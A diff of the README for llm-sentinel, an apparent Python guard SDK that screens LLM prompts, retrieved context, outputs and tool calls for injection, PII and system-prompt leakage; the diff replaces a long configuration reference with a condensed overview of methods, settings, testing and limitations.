-guard = Guard(policy_dir="policies/", identity_provider=OktaIdentityProvider())
-```
-
-The shipped `StaticIdentityProvider` reads an optional `identities.yaml` and falls back to `["default"]` for unknown users. It exists so the pipeline works out of the box — replace it for production.
-
----
-
-## REST gateway
-
-The HTTP sidecar for non-Python stacks (Node.js, Go, Ruby, …) lives in a separate project,
-**[llm-sentry-gateway](../llm-sentry-gateway)**. It is a thin FastAPI layer over this SDK: it adds
-the endpoints (`/v1/input/analyze`, `/v1/output/analyze`, `/v1/context/check`, `/v1/tools/check`,
-`/healthz`), bearer-token auth (`SENTINEL_API_KEY`) and a request-body size cap
-(`SENTINEL_MAX_REQUEST_BYTES`), and uses the same pipeline, policies and `SENTINEL_*` settings as `Guard`.
-This package contains no web framework and no server.
-
----
-
-## Configuration Reference
-
-All values can be set in `.env` (prefix `SENTINEL_`) or as environment variables. Gateway-only settings (`SENTINEL_API_KEY`, `SENTINEL_MAX_REQUEST_BYTES`) are documented in llm-sentry-gateway.
-
-### Input pipeline
-
-| Variable | Default | Effect |
-|----------|---------|--------|
-| `SENTINEL_MAX_PROMPT_LENGTH` | `8192` | Maximum prompt length in characters |
-| `SENTINEL_RATE_LIMIT_REQUESTS` | `0` (off) | Max calls per window per caller (key: `user_id`, else `application_id`, else client IP). Exceeded → SDK raises `RateLimitExceeded` (gateway: `429` + `Retry-After`). Per-process counters. |
-| `SENTINEL_RATE_LIMIT_WINDOW_SECONDS` | `60` | Rate-limit window |
-| `SENTINEL_TOKEN_BUDGET_TOKENS` | `0` (off) | Max **estimated tokens** of checked text (prompts, responses, context) per caller per window. Exceeded → SDK raises `TokenBudgetExceeded` (a `RateLimitExceeded`; gateway: `429`, `Token budget exceeded`). Estimated without a tokenizer: ~4 chars/token for ASCII, 1 per non-ASCII character (errs high). Per-process counters. |
-| `SENTINEL_TOKEN_BUDGET_WINDOW_SECONDS` | `3600` | Token-budget window |
-| `SENTINEL_CHARS_PER_TOKEN` | `4.0` | Characters per token for the estimate |
-| `SENTINEL_RATE_LIMIT_MAX_KEYS` | `10000` | Max tracked callers; when full of live keys, new callers are rejected (fail closed) |
-| `SENTINEL_CLASSIFIER_MAX_CHUNKS` | `8` | Max 512-token chunks scored per prompt; longer prompts skip the classifier and return `review` |
-| `SENTINEL_CONTROL_CHARS_PATTERN` | `\x00-\x08…` | Control chars that reject the request |
-| `SENTINEL_RULES_FILE` | `default.yaml` | Input rule pack filename (resolved inside `sentinel/rules/` package directory) |
-| `SENTINEL_CLASSIFIER_MODEL` | `meta-llama/Llama-Prompt-Guard-2-86M` | Classifier model id or local path |
-| `SENTINEL_CLASSIFIER_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
-| `SENTINEL_DISABLE_CLASSIFIER` | `false` | Skip the classifier stage entirely |
-| `SENTINEL_CLASSIFIER_THRESHOLD_MEDIUM` | `0.50` | Score at which verdict becomes `review` |
-| `SENTINEL_CLASSIFIER_THRESHOLD_HIGH` | `0.90` | Score at which verdict becomes `block` |
-
-### Policy
-
-| Variable | Default | Effect |
-|----------|---------|--------|
-| `SENTINEL_POLICIES_DIR` | `policies` | Directory of per-application policy YAML files |
-| `SENTINEL_PII_MODEL` | `iiiorg/piiranha-v1-detect-personal-information` | Structured PII model |
-| `SENTINEL_PII_NER_MODEL` | `dslim/bert-base-NER` | Secondary NER model for names/locations |
-| `SENTINEL_DISABLE_PII` | `false` | Skip PII detection entirely |
-| `SENTINEL_CLASSIFIER_REVISION` / `SENTINEL_SAFETY_REVISION` / `SENTINEL_PII_REVISION` / `SENTINEL_PII_NER_REVISION` / `SENTINEL_SEMANTIC_LEAK_REVISION` | `` | Pin each model to a Hugging Face commit hash (empty = repo default). See [Model supply chain](#model-supply-chain-owasp-llm03) |
-| `SENTINEL_REQUIRE_PINNED_MODELS` | `false` | Refuse to load any model not pinned to a 40-hex commit hash; the stage reports unavailable, so verdicts become `review` |
-| `SENTINEL_IDENTITIES_FILE` | `identities.yaml` | Static identity file (placeholder IAM) |
-
-### Output pipeline
-
-| Variable | Default | Effect |
-|----------|---------|--------|
-| `SENTINEL_MAX_OUTPUT_LENGTH` | `16384` | Maximum output length in characters |
-| `SENTINEL_MAX_CONTEXT_LENGTH` | `100000` | Max length of one piece of untrusted content, in characters |
-| `SENTINEL_CONTEXT_CLASSIFIER_MAX_CHUNKS` | `32` | Classifier chunks scored per document; more → verdict `review` |
-| `SENTINEL_CONTEXT_RULES_FILE` | `context.yaml` | Context rule pack filename (inside `sentinel/rules/`) |
-| `SENTINEL_TOOL_MAX_ARGS_BYTES` | `16384` | Max serialized size of one tool call's arguments |
-| `SENTINEL_TOOL_ARG_MAX_LENGTH` | `4096` | Default max length of a string tool argument (per-argument `max_length` overrides) |
-| `SENTINEL_OUTPUT_RULES_FILE` | `output.yaml` | Output rule pack filename (resolved inside `sentinel/rules/` package directory) |
-| `SENTINEL_DISABLE_SEMANTIC_LEAK` | `false` | Turn off the embedding-similarity leak check (overridable per call with `semantic_leak`) |
-| `SENTINEL_SEMANTIC_LEAK_MODEL` | `sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2` | Sentence-embedding model id or local path |
-| `SENTINEL_SEMANTIC_LEAK_THRESHOLD` | `0.80` | Cosine similarity at which a response sentence counts as restating the prompt |
-| `SENTINEL_SEMANTIC_LEAK_MIN_WORDS` | `4` | Sentences shorter than this are ignored |
-| `SENTINEL_SEMANTIC_LEAK_MAX_SEGMENTS` | `256` | Max sentences per side; beyond this the stage skips and the verdict is `review` |
-| `SENTINEL_SEMANTIC_LEAK_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
-| `SENTINEL_MAX_SYSTEM_PROMPT_LENGTH` | `32768` | Max `system_prompt` characters accepted for leak checks |
-| `SENTINEL_MAX_CANARIES` | `16` | Max canaries per call |
-| `SENTINEL_DISABLE_OUTPUT_HANDLING` | `false` | Skip the output-handling stage (LLM05) entirely |
-| `SENTINEL_OUTPUT_IMAGES` | `strip` | Default for markdown images: `allow` · `allowlist` · `strip` · `block` |
-| `SENTINEL_OUTPUT_LINKS` | `allow` | Default for links/URLs: `allow` · `allowlist` · `strip` · `block` |
-| `SENTINEL_OUTPUT_HTML` | `sanitize` | Default for raw HTML: `allow` · `sanitize` · `block` |
-| `SENTINEL_OUTPUT_SECRETS` | `flag` | Unknown-format secrets (`api_key = "…"`, high-entropy tokens): `allow` · `flag` · `redact` · `block`. Heuristic, so it flags rather than blocks by default |
-| `SENTINEL_OUTPUT_SQL` | `allow` | Default for SQL-injection indicators: `allow` · `flag` · `block` · `readonly` |
-| `SENTINEL_OUTPUT_ALLOWED_DOMAINS` | *(empty)* | Comma-separated hosts for `allowlist` mode (subdomains match) |
-| `SENTINEL_SAFETY_MODEL` | `meta-llama/Llama-Guard-3-1B` | Llama Guard model id or local path |
-| `SENTINEL_SAFETY_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
-| `SENTINEL_DISABLE_SAFETY` | `false` | Skip the safety classifier entirely |
-| `SENTINEL_SAFETY_MAX_NEW_TOKENS` | `20` | Max tokens to generate for the verdict |
-| `SENTINEL_SAFETY_EXCLUDED_CATEGORIES` | `` | Comma-separated hazard codes to suppress, e.g. `S6,S13` |
-
----
-
-## Test
+Use a custom `identity_provider` to resolve users and roles from your IAM. The bundled static provider is only a development placeholder.
+
+## Main SDK methods
+
+| Method | Use it for |
+|---|---|
+| `check_input()` | Validate a user prompt before the LLM call |
+| `check_context()` | Inspect retrieved documents, web pages, emails, and tool results |
+| `check_output()` | Validate and sanitize the model response |
+| `check_tool_call()` | Authorize a tool call before executing it |
+| `wrap_untrusted()` | Fence context that passed inspection before adding it to a prompt |
+| `with_canary()` | Add a system-prompt canary for leakage detection |
+
+Use `raise_on_block=True` or import `PromptBlocked`, `OutputBlocked`, `ContextBlocked`, and `ToolBlocked` when exceptions are preferable to inspecting response objects.
+
+## Configuration essentials
+
+All environment variables use the `SENTINEL_` prefix. Defaults and the complete configuration surface are defined in [`sentinel/config.py`](sentinel/config.py).
+
+| Setting | Purpose |
+|---|---|
+| `SENTINEL_DISABLE_CLASSIFIER` | Disable Prompt Guard; checks then return `review` when classification is required |
+| `SENTINEL_DISABLE_PII` | Disable PII detection; configured PII policies fail closed to `review` |
+| `SENTINEL_DISABLE_SAFETY` | Disable Llama Guard; output safety becomes `review` |
+| `SENTINEL_DISABLE_SEMANTIC_LEAK` | Disable the embedding-based system prompt paraphrase check; the canary leak check still runs |
+| `SENTINEL_RATE_LIMIT_REQUESTS` | Per-caller request limit; `0` disables it |
+| `SENTINEL_TOKEN_BUDGET_TOKENS` | Per-caller estimated-token budget; `0` disables it |
+| `SENTINEL_MAX_PROMPT_LENGTH` / `SENTINEL_MAX_OUTPUT_LENGTH` | Text size limits |
+| `SENTINEL_REQUIRE_PINNED_MODELS` | Require 40-character Hugging Face commit hashes |
+
+For model supply-chain setup:
 
 ```bash
-# Unit tests — runs in a few seconds, no ML models loaded
+python scripts/pin_models.py
+```
+
+Review the revisions, commit them to deployment configuration, and enable `SENTINEL_REQUIRE_PINNED_MODELS=true`.
+
+## Testing
+
+```bash
+pip install -e ".[dev]"
 pytest
 ```
 
-REST tests and the live end-to-end curl scripts are in llm-sentry-gateway.
-
-The test suite sets `SENTINEL_DISABLE_CLASSIFIER=true`, `SENTINEL_DISABLE_PII=true`, `SENTINEL_DISABLE_SAFETY=true` and `SENTINEL_DISABLE_SEMANTIC_LEAK=true` (in `tests/conftest.py`) so it never loads transformer models — CI stays fast.
-
-### Calibrating thresholds on the real models
-
-The unit tests use fake models, so they cannot tell you whether a threshold suits real traffic. `scripts/calibrate.py` runs the real models over labelled cases and suggests a value:
+Threshold calibration for real models is available through:
 
 ```bash
-pip install -e ".[ml]"
-python scripts/calibrate.py leak       # semantic system-prompt-leak threshold (LLM07)
-python scripts/calibrate.py context    # Prompt Guard 2 on documents (LLM01)
+python scripts/calibrate.py leak
+python scripts/calibrate.py context
 ```
 
-It prints every score, the distribution of each group, how often the *current* threshold catches leaks / flags benign text, and the best threshold (`separable` = a clean gap exists; otherwise the best-F1 compromise). The cases live in `scripts/data/*.yaml` — replace them with replies and documents from your own domain; the suggestion is only as good as the data. Exit code `1` means the groups overlap; `2` means a model could not load.
+The unit suite disables ML models through `tests/conftest.py` so it remains fast and deterministic.
 
-## Model supply chain (OWASP LLM03)
+## Project layout
 
-A model id such as `meta-llama/Llama-Prompt-Guard-2-86M` follows the repo's `main` branch, so a compromised or silently updated repo changes what your guard loads. Pin every model:
-
-```bash
-python scripts/pin_models.py     # prints SENTINEL_*_REVISION for the models in your HF cache
+```text
+sentinel/            In-process Python SDK
+policies/            Per-application policy examples
+sentinel/rules/      Input, output, and context rule packs
+tests/               Unit and SDK tests
+examples/            Basic SDK, context/tool, and canary examples
+scripts/             Model pinning and threshold calibration
+OWASP_MAPPING.md     Detailed OWASP coverage and limitations
+MODELS.md            ML model access, download, and pinning
 ```
 
-Review those revisions, commit them to your deployment config, and set `SENTINEL_REQUIRE_PINNED_MODELS=true`: any model that is unpinned (or pinned to a mutable branch/tag instead of a full commit hash) fails to load, and its stage returns `review` rather than running unvetted code. Loaders never pass `trust_remote_code` (a test enforces it).
+## Important limitations
 
-CI (`.github/workflows/ci.yml`) runs the tests on Python 3.11/3.12, then `pip-audit` (dependency advisories, also weekly on a schedule), `bandit` and `semgrep` on this repo's code. Locally: `pip install -e ".[security]"`.
-
-Not covered: the ML extras (`torch`, `transformers`) are audited only when installed in the CI environment, and a pinned revision proves *which* weights load, not that they are benign — review a model before you pin it.
-
----
-
-## Project Layout
-
-```
-llm-sentinel/
-├── sentinel/
-│   ├── __init__.py          # exports: Guard, PromptBlocked, OutputBlocked, ToolBlocked, ContextBlocked, ...
-│   ├── guard.py             # Guard class — in-process SDK entry point
-│   ├── config.py            # All settings via pydantic-settings + .env
-│   ├── audit.py             # JSON-line audit log to stdout (hash-only)
-│   ├── identity.py          # IdentityProvider protocol + StaticIdentityProvider
-│   ├── ratelimit.py         # Weighted sliding-window limiter, token budget
-│   ├── models/
-│   │   └── response.py      # AnalyzeResponse, OutputAnalyzeResponse, stage models
-│   ├── pipeline/
-│   │   ├── normalization.py # text canonicalization
-│   │   ├── rules.py         # YAML rule engine (input / output / context packs)
-│   │   ├── classifier.py    # Prompt Guard 2 classifier
-│   │   ├── safety.py        # Llama Guard 3 safety classifier
-│   │   ├── pii.py           # PII detection + redact()
-│   │   ├── policy.py        # capabilities / topics / PII / output / tools policy
-│   │   ├── output_handling.py, secret_scan.py, sql_guard.py   # LLM05 / LLM02
-│   │   ├── leakage.py, semantic_leak.py                       # LLM07
-│   │   ├── tool_guard.py                                      # LLM06
-│   │   ├── context_guard.py                                   # LLM01 (indirect)
-│   │   └── model_pin.py, model_loading.py                     # LLM03
-│   └── rules/
-│       ├── default.yaml     # Input pack: injection, delimiter, secret patterns
-│       ├── output.yaml      # Output pack: leakage + secret patterns
-│       └── context.yaml     # Context pack: injection in retrieved content
-├── policies/
-│   └── support-bot.yaml     # Example application policy
-├── tests/                   # SDK tests (ML disabled by conftest.py)
-├── scripts/
-│   ├── calibrate.py         # threshold calibration on the real models (data in scripts/data/)
-│   └── pin_models.py        # print SENTINEL_*_REVISION for cached models
-├── .github/workflows/ci.yml # tests + pip-audit + bandit + semgrep
-├── identities.example.yaml  # Template for static user→role mapping
-└── pyproject.toml
-```
-
----
-
-## Audit Log
-
-Every `check_input` / `check_output` call writes a JSON line to stdout:
-
-```json
-{"ts": "2024-01-01T00:00:00Z", "request_id": "…", "stage": "classifier",
- "verdict": "block", "prompt_hash": "sha256:…", "application_id": "my-app",
- "risk_score": 0.97}
-```
-
-Output pipeline stages use `output_hash` instead of `prompt_hash`, and stage names `output_rule_checks`, `safety`, `output_policy`.
-
-Content is **never logged** — only the SHA-256 hash. Pipe stdout to your log aggregator to retain audit trails without storing sensitive user input.
-
----
-
-## Performance
-
-| Stage | Typical latency |
-|-------|----------------|
-| Rule checks | < 1 ms |
-| Prompt Guard 2 (86M, MPS) | ~5 ms |
-| PII detection (piiranha + bert-base-NER, MPS) | ~50–100 ms |
-| Llama Guard 3-1B (MPS) | ~100–300 ms |
-
-Llama Guard generates output tokens (causal LM) rather than doing a single forward pass, which is why it's slower than Prompt Guard despite similar hardware. For high-throughput deployments, disable the safety classifier (`SENTINEL_DISABLE_SAFETY=true`) or enforce it only on responses above a token-count threshold.
-
----
-
-## Roadmap
-
-- **FastAPI middleware** — `app.add_middleware(SentinelMiddleware, guard=guard)` for automatic per-route enforcement
-- **Decorator** — `@guard.protect` for selective per-endpoint coverage
-- **MCP server** — expose `check_input`, `check_output`, `explain_violation` as MCP tools for Claude Code
-- **OpenAI-compatible proxy** — drop-in `base_url` override that wraps any LLM backend
-- **Semantic topic classification** — replace keyword blocking with an embedding-based classifier (v2)
-- **Async mode** — non-blocking classifiers for high-throughput deployments
-- **OpenTelemetry** — structured spans per pipeline stage
-
----
+This library is a guard, not a sandbox or IAM system. Keep least privilege in the tool runtime, use parameterized queries, encode output at the final sink, enforce tenant access in the data layer, and apply global rate limits at your gateway. In-memory limits are per process. ML thresholds should be calibrated against representative traffic.
 
 ## License
 
